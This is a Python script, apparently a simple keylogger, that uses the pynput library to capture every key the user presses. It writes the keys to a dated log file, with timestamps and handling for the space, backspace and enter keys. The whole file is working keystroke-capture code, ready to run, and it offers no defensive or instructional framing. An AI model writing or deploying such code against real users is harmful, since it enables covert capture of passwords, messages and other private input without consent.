from pynput import keyboard
from datetime import datetime
dict1 = {
    "Key.space": " ",
    "Key.ctrl": " Control ",
    "Key.backspace":"backspace",
    "Key.enter": "enter"
}
current_datetime = datetime.now()
current_time = current_datetime.strftime("%d-%m-%Y")
file_name = f"logs/{current_time}.txt"
current_time = current_datetime.strftime("%d/%m/%Y %H:%M:%S")

with open(file_name, "w") as file:
    file.write("")
#
# def mainLoop():
#     while True:
#         show = input("enter command: ")
#         if show == "show":
#             with open(file_name, "r") as file:
#                 print(file.read())
def on_press(key):
    # this function is tracking and printing all the keys the user is typing
    tempKey = ''
    global current_time
    try:
        tempKey = key.char
        # print(f'Key pressed: {key.char}')

    except AttributeError:
        tempKey = str(key)
        if tempKey in dict1:
            tempKey = dict1[tempKey]
        else:
            tempKey = " '"+tempKey+"' "


        if tempKey == "backspace":
            data = ''
            with open(file_name, "r") as f:
                data = f.read()
            with open(file_name, "w") as f:
                f.write(data[:-1])
            return
        elif tempKey == "enter":
            data = ''
            with open(file_name, "a") as f:
                f.write('\n')
            return
        # print(f'Special key pressed: {key}')
    # print(tempKey)
    current_datetime = datetime.now()
    tempTime = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    if tempTime != current_time:
        with open(file_name, "a") as file:
            file.write("\n***** " + tempTime + " *****\n")
            current_time = tempTime
    with open(file_name, "a") as file:
        file.write(tempKey)
listener = keyboard.Listener(on_press = on_press)
listener.start()
listener.join()
